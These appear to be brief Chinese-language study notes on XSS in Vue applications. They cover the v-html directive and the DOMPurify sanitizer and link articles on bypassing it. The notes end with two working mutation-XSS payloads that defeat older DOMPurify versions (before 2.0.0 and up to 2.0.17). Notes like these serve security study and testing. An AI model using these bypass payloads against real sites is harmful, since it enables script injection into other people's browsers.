# XSS 漏洞详攻防对抗过程
- https://tech.meituan.com/2018/09/27/fe-security.html
# VUE中的XSS
- https://blog.csdn.net/weixin_48138187/article/details/135126485
## v-html
v-html 是一个指令，用于动态地将 HTML 内容插入到元素中。与 {{ }} 绑定文本不同，v-html 可以解析并插入 HTML 内容，这使得你可以将 HTML 代码直接渲染到 DOM 中。
## DOMPurify
DOMPurify 是一个非常强大的库，用于清理和消毒 HTML 内容。它的主要目标是防止 XSS（跨站脚本攻击）和其他基于 HTML 的注入攻击。DOMPurify.sanitize 会移除或清理潜在的恶意代码，包括嵌入的 JavaScript 代码。具体地说，DOMPurify 会过滤掉不安全的元素和属性，而不是将其转换为实体编码。
## 绕过DOMPurify
- https://xz.aliyun.com/t/6413?time__1311=n4%2BxnD0Dg70%3DG%3DfPGNnmnDRiWDCDunnnxWTuypD
- https://www.anquanke.com/post/id/219089
- https://xz.aliyun.com/t/8384?time__1311=n4%2BxnD0DcDuDgnDBDmx05fbDyQoUAhvqh%2BbID
## payload
```javascript
// DOMPurify < V2.0.0 
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">

// DOMPurify <=  2.0.17
<form>
    <math><mtext>
</form><form>
    <mglyph>
        <style></math><img src onerror=alert(1)>

```